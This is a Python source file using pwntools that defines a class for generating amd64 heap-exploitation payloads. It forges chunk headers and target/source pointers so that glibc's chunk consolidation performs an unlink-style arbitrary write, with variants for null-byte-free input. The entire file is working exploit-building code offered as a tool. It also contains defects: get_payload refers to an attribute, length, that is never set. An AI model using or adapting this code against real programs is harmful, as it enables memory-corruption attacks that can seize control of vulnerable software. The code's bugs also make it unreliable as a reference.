from pwn import fit, p64


class amd64payload:
    def __init__(self, target, source,
                 offset, length, null_bytes=False):
        self.target = target
        self.source = source
        self.offset = offset
        self.post_length = length - offset - 16
        self.null_bytes = null_bytes
        self.payload = ""
        if self.null_bytes is False:
            if self.offset < 16 or self.post_length < 20:
                raise LengthError("Not enough length for payload")

    def backward_consolidate(self):
        if self.null_bytes is True:
            self.payload = fit({self.offset - 24: p64(0x21),
                                self.offset - 16: p64(self.target-24),
                                self.offset - 8: p64(self.source),
                                self.offset: p64(0x20) + p64(0x10),
                                self.offset + 16: p64(1)*2
                                })
        else:
            self.payload = fit({self.offset - 32: p64(-15, signed=True)*2,
                                self.offset - 16: p64(-15, signed=True)*2,
                                self.offset: p64(-16, signed=True)*2,
                                self.offset + 16: p64(-15, signed=True)*2,
                                self.offset + 32: p64(self.target-24),
                                self.offset + 40: p64(self.source)
                                })
        return self.payload

    def forward_consolidate(self):
        offset = self.offset
        target = self.target
        source = self.source
        if self.null_bytes is True:
            self.payload = fit({self.offset + 8: p64(1),
                                self.offset + 16: p64(self.target-24),
                                self.offset + 24: p64(self.source)
                                })
        else:
            self.payload = fit({self.offset - 32: p64(-16, signed=True),
                                self.offset - 24: p64(-15, signed=True),
                                self.offset - 16: p64(self.target-24),
                                self.offset - 8: p64(self.source),
                                self.offset: p64(-31, signed=True)*2
                                })
        return self.payload

    def get_payload(self):
        self.payload = self.backward_consolidate()
        if len(self.payload) < self.length:
            return self.payload
        else:
            self.payload = self.forward_consolidate()
            if len(self.payload) < self.length:
                return self.payload


class LengthError(Exception):
    def __init__(self, message):
        self.message = message
